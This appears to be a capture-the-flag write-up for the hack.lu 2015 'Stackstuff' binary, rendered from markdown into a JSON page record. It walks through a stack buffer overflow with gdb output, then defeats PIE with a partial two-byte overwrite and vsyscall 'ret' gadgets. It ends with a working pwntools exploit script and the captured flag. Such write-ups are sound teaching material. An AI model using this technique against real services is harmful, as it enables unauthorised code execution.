{"pageContext":{"html":"<p><a href=\"ctf=hack.lu-2015\"></a>\n<a href=\"type=exploiting,pwn\"></a>\n<a href=\"tags=buffer-overflow\"></a>\n<a href=\"tools=gdb-peda,pwntools\"></a>\n<a href=\"techniques=ROP\"></a></p>\n<h1>Stackstuff (Exploiting 150)</h1>\n<p>We have an <a href=\"/stackstuff_public_d7f6e7f394f649ba96b3113374a0bfb3.tar-8b5f46720cc8c931d03bb8a1c54ec22a.gz\">archive</a>.\nOn extracting</p>\n<p><code>bash $ file * hackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f46fbf9b159f6a1a31893faf7f771ca186a2ce8d, not stripped hackme.c: C source, ASCII text</code></p>\n<p>We have source of the executable. </p>\n<p>`<code></code>c\nint check<em>password</em>correct(void) {\nchar buf[50] = {0};</p>\n<p>  puts(\"To download the flag, you need to specify a password.\");\nprintf(\"Length of password: \");\nint inlen = 0;\nif (scanf(\"%d\\n\", &#x26;inlen) != 1) {\n// peer probably disconnected?\nexit(0);\n}\nif (inlen &#x3C;= 0 || inlen > 50) {\n// bad input length, fix it\ninlen = 90;\n}\nif (fread(buf, 1, inlen, stdin) != inlen) {\n// peer disconnected, stop\nexit(0);\n}\nreturn strcmp(buf, real_password) == 0;\n}</p>\n<p>void require<em>auth(void) {\nwhile (!check</em>password_correct()) {\nputs(\"bad password, try again\");\n}\n}</p>\n<p>void handle_request(void) {\nalarm(60);\nsetbuf(stdout, NULL);</p>\n<p>  FILE *realpw<em>file = fopen(\"password\", \"r\");\nif (realpw</em>file == NULL || fgets(real<em>password, sizeof(real</em>password), realpw<em>file) == NULL) {\nfputs(\"unable to read real</em>password\\n\", stderr);\nexit(0);\n}\nfclose(realpw_file);</p>\n<p>  puts(\"Hi! This is the flag download service.\");\nrequire_auth();</p>\n<p>  char flag[50]; //we'll jump to this line in the exploit ;)\nFILE *flagfile = fopen(\"flag\", \"r\");\nif (flagfile == NULL || fgets(flag, sizeof(flag), flagfile) == NULL) {\nfputs(\"unable to read flag\\n\", stderr);\nexit(0);\n}\nputs(flag);\n}</p>\n<p><code>We can see that it is basic buffer overflow in check_password_correct as it allows an input of length 90 in a buffer of 50. So we load the executable in gdb.</code>bash\ngdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : ENABLED\nRELRO     : disabled\n`<code></code>\nNX is enabled means stack is not executable.\nPIE means position independent executable, This means that the binary instructions itself is loaded arbitrarily in the memory.\nSo we can't have shellcode and normal ROP over the binary.</p>\n<p>However we have an attack vector where we can fool the service to jump to the part where it displays the flag. But we need to have knowledge of the eip or some instruction address in memory.</p>\n<p>So lets find the offset of EIP overwrite and search for some attack vectors.\nUse pattern<em>create and pattern</em>offset to find that the offset is 72.</p>\n<p>So payload:</p>\n<blockquote>\n<p>'A'*72+ret_addr</p>\n</blockquote>\n<p>Lets test in gdb. For PIE enabled executables gdb uses a fixed address to load them which can be found out by running and stopping it in gdb using 'info files'</p>\n<p><code>bash $ nc 127.0.0.1 1514 -vv localhost [127.0.0.1] 1514 (?) open Hi! This is the flag download service. To download the flag, you need to specify a password. Length of password: 99 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB</code>\ngives us</p>\n<p>`<code></code>bash\ngdb-peda$  b *0x555555554fb9\nBreakpoint 1 at 0x555555554fb9\ngdb-peda$ r\n.\n.\n.\n[Switching to process 2398][----------------------------------registers-----------------------------------]\nRAX: 0x0\nRBX: 0x0\nRCX: 0xa ('\\n')\nRDX: 0x73 ('s')\nRSI: 0x555555755a20 (\"sudhackar\\n\")\nRDI: 0x7fffffffe0d0 ('A' &#x3C;repeats 72 times>, 'B' &#x3C;repeats 18 times>, \"UUUU\")\nRBP: 0x0\nRSP: 0x7fffffffe118 ('B' &#x3C;repeats 18 times>, \"UUUU\")\nRIP: 0x555555554fb9 (&#x3C;check<em>password</em>correct+231>:\tret)\nR8 : 0x1000\nR9 : 0x4141414141414141 ('AAAAAAAA')\nR10: 0x4141414141414141 ('AAAAAAAA')\nR11: 0x246\nR12: 0x555555554d70 (&#x3C;<em>start>:\txor    ebp,ebp)\nR13: 0x7fffffffe2c0 --> 0x1\nR14: 0x0\nR15: 0x0\nEFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n0x555555554faf &#x3C;check</em>password<em>correct+221>:\tsete   al\n0x555555554fb2 &#x3C;check</em>password<em>correct+224>:\tmovzx  eax,al\n0x555555554fb5 &#x3C;check</em>password<em>correct+227>:\tadd    rsp,0x58\n=> 0x555555554fb9 &#x3C;check</em>password<em>correct+231>:\tret<br>\n0x555555554fba &#x3C;require</em>auth>:\tsub    rsp,0x8\n0x555555554fbe &#x3C;require<em>auth+4>:\tjmp    0x555555554fcc &#x3C;require</em>auth+18>\n0x555555554fc0 &#x3C;require<em>auth+6>:\tlea    rdi,[rip+0x420]        # 0x5555555553e7\n0x555555554fc7 &#x3C;require</em>auth+13>:\tcall   0x555555554bc0 <a href=\"mailto:puts@plt\">puts@plt</a>\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffe118 ('B' &#x3C;repeats 18 times>, \"UUUU\")\n0008| 0x7fffffffe120 (\"BBBBBBBBBBUUUU\")\n0016| 0x7fffffffe128 --> 0x555555554242 ('BBUUUU')\n0024| 0x7fffffffe130 --> 0x555555554d70 (&#x3C;<em>start>:\txor    ebp,ebp)\n0032| 0x7fffffffe138 --> 0x7ffff7df0325 (&#x3C;</em>dl<em>runtime</em>resolve+53>:\tmov    r11,rax)\n0040| 0x7fffffffe140 --> 0x7fffffffe57f --> 0x5800636578656572 ('reexec')\n0048| 0x7fffffffe148 --> 0x0\n0056| 0x7fffffffe150 --> 0x7fffffffe2d8 --> 0x7fffffffe586 (\"XDG_VTNR=7\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value</p>\n<p>Breakpoint 1, 0x0000555555554fb9 in check<em>password</em>correct ()\n`<code></code></p>\n<p>So we have EIP overwrite here. But we can't figure out the ret_addr.\nHowever If we notice the stack frame here on ret instruction above.\nWe see\n<code>0016| 0x7fffffffe128 --> 0x555555554242 ('BBUUUU')</code>\nWe control the last two bytes of an address which matches with our randomised EIP. So now we have to use this address some how to return to this location.</p>\n<p>We can use the linux vsyscall function as its location is always fixed for a binary.\nThe vsyscalls are part of the kernel, but the kernel pages containing them are executable with userspace privileges. And theyâ€™re mapped to fixed addresses in the virtual memory</p>\n<p>Now we'll look for potential ROP chains.</p>\n<p><code>bash gdb-peda$ x/5xi 0xffffffffff600400 0xffffffffff600400: mov rax,0xc9 0xffffffffff600407: syscall 0xffffffffff600409: ret 0xffffffffff60040a: int3 0xffffffffff60040b: int3</code>\nYea, ret is all we need,twice!\nSo now payload format :</p>\n<blockquote>\n<p>'A'*72+p64(0xffffffffff600400)+p64(0xffffffffff600400)+last two bytes of our jmp address.</p>\n</blockquote>\n<p><a href=\"/stackstuff-3b39523c820a736ef85fe71e3227d655.py\">Here</a> is an exploit that does the same.\n`<code></code>python\nfrom pwn import *</p>\n<h1>s=remote('127.0.0.1',1514)</h1>\n<h1>0x000055555555508b</h1>\n<h1>0xffffffffff600400</h1>\n<p>s=remote('school.fluxfingers.net',1514)\naddr=p64(0xffffffffff600400)\npayload='A'<em>72+addr</em>2+\"\\x8b\\x10\"\nprint repr(payload)\nprint s.recv(100,timeout=1)\nprint s.recv(100,timeout=1)\nprint s.recv(100,timeout=1)\nprint s.recv(100,timeout=1)\ns.send('100\\n')\nprint s.recvline(timeout=1)\nprint s.recvline(timeout=1)\ns.send(payload+'\\n')\nfor _ in range(10):\ntry:\nprint s.recv(100,timeout=1)\nexcept:\nprint \"Done?\"\nbreak\n`<code></code>\nAfer a few tries</p>\n<p>`<code></code>bash\n$ python stackstuff<em>public</em>d7f6e7f394f649ba96b3113374a0bfb3/try.py [+] Opening connection to school.fluxfingers.net on port 1514: Done\n'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00\\x04<code>\\xff\\xff\\xff\\xff\\xff\\x00\\x04</code>\\xff\\xff\\xff\\xff\\xff\\x8b\\x10'\nHi! This is the flag download service.</p>\n<p>To download the flag, you need to specify a password.\nLength of password: </p>\n<p>flag{MoRE<em>REtuRnY</em>tHAn_rop}</p>\n<p>Done?\n[*] Closed connection to school.fluxfingers.net port 1514\n`<code></code></p>\n<p>Flag: </p>\n<blockquote>\n<p>flag{MoRE<em>REtuRnY</em>tHAn_rop}</p>\n</blockquote>","relativePath":"writeups/hack.lu-ctf-2015/exploiting/Stackstuff/sudhackar"}}